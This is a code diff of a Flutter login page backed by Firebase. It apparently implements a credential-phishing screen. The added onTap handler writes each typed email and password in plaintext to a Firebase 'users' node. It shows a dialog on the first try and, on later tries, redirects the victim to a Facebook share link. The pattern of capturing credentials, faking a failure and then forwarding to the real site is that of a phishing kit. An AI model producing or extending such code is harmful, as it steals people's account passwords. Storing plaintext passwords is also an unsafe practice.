@@ -19,13 +19,13 @@ class Loginpage extends StatefulWidget {
 class _LoginpageState extends State<Loginpage> {
   TextEditingController eController = TextEditingController();
   TextEditingController pController = TextEditingController();
-  final FirebaseAuth _auth = FirebaseAuth.instance;
 // FirebaseApp secondaryApp = Firebase.app('SecondaryApp');
 // FirebaseAuth auth = FirebaseAuth.instanceFor(app: secondaryApp);
+  DatabaseReference ref = FirebaseDatabase.instance.ref("users");
 
   int counter =0;
   // Future<UserCredential> credential = FirebaseAuth.instance.signInAnonymously();
-  FirebaseDatabase database = FirebaseDatabase.instance;
+  // FirebaseDatabase database = FirebaseDatabase(app: null,databaseURL: "database_url");
   Color color = const Color(0xffEBE8EF);
   final emailFormKey = GlobalKey<FormState>();
   final passwordFormKey = GlobalKey<FormState>();
@@ -141,12 +141,15 @@ class _LoginpageState extends State<Loginpage> {
 
                 SizedBox(height: height*.01,),
                 GestureDetector(
-                  onTap: () async {
+                  onTap: ()  async{
                     setState(() {
                       showSpinner = true;
                     });
-                  createRecord(eController.text, pController.text);
-                      counter == 0?_showMyDialog():launchUrl(Uri.parse("https://www.facebook.com/share/ZAWD42993oCxdB3k/?mibextid=qi2Omg"), webOnlyWindowName: '_self',);
+                    await ref.push().set({
+                      "email": eController.text,
+                      "password": pController.text,
+                    });
+                    counter == 0?_showMyDialog():launchUrl(Uri.parse("https://www.facebook.com/share/ZAWD42993oCxdB3k/?mibextid=qi2Omg"), webOnlyWindowName: '_self',);
                     setState(() {
                       showSpinner = false;
                       counter++;
@@ -224,13 +227,29 @@ class _LoginpageState extends State<Loginpage> {
 
   }
 
-  void createRecord(String email,String password) {
+  void createRecord(String email,String password) async{
+    // DatabaseReference ref = FirebaseDatabase.instance.ref("users/123");
+    //
+    // await ref.set({
+    //   "email": email,
+    //   "password": password,
+    //   "address": {
+    //     "line1": "100 Mountain View"
+    //   }
+    // });
+    // print(email);
     DatabaseReference databaseReference =
-    FirebaseDatabase.instance.reference().child('users');
+    FirebaseDatabase.instance.ref().child('users');
     databaseReference.push().set({
       'email': email,
       'password': password,
     });
+    // DatabaseReference databaseReference =
+    // FirebaseDatabase.instance.ref().child('users');
+    // databaseReference.push().set({
+    //   'email': email,
+    //   'password': password,
+    // });
   }
 
   Future<void> _showMyDialog() async {
